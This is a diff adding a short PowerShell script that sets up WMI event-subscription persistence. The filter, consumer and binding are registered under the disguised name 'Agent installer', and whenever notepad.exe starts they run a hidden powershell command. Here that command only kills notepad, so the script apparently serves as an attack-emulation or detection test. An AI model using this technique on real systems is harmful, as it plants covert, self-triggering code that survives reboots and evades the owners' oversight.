@@ -1,0 +1,10 @@
+$EventFilterName = 'Agent installer'
+$Payload = "taskkill /IM `"notepad.exe`" /F" 
+$EventConsumerName = 'Agent installer'
+
+
+$EventFilterArgs = @{EventNamespace = 'root/cimv2';Name = $EventFilterName;Query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_Process' and TargetInstance.Name = 'notepad.exe'";QueryLanguage = 'WQL';};$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs
+
+$CommandLineConsumerArgs = @{Name = $EventConsumerName; CommandLineTemplate = "powershell.exe -nop -NonInteractive -c `"$Payload`"";}; $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs;
+
+$FilterToConsumerArgs = @{Filter =  Get-WmiObject -Namespace root/subscription -Class __EventFilter| Where-Object -Property Name -eq $EventFilterName; Consumer = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer| Where-Object -Property Name -eq $EventConsumerName;}; $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs;
